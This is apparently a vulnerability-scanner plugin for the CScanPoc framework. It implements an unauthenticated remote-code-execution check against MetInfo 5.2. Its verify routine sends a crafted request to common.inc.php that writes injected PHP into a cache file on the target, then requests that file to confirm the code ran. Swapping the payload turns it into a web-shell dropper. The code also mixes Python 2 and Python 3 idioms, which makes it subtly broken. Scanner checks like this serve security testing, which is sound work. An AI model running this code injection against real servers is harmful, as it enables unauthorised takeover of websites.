# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import os
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0001'  # 平台漏洞编号，留空
    name = 'MetInfo 无需登录前台GETSHELL'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-02-02'  # 漏洞公布时间
    desc = '''
       全量覆盖met_admin_type_ok=1 就可以直接赋值无过滤赋值$languser.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = '5.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a97a3244-76ad-4b30-93b3-664e1d01b0ad'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = 'echo md5("cscan");//'
            name = os.urandom(3).encode('hex')
            shell_url = '%s/cache/langadmin_%s.php' % (self.target, name)
            verify_url = (
                '%s/admin/include/common.inc.php?met_admin_type_ok=1&langset=%s&m'
                'et_langadmin[%s][]=12345&str=%s' %
                (self.target, name, name, urllib.parse.quote(payload))
            )

            requests.get(verify_url)
            content = requests.get(shell_url).text
            if 'd46fe895e9d1207f7a2251ccfa0c24d3' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
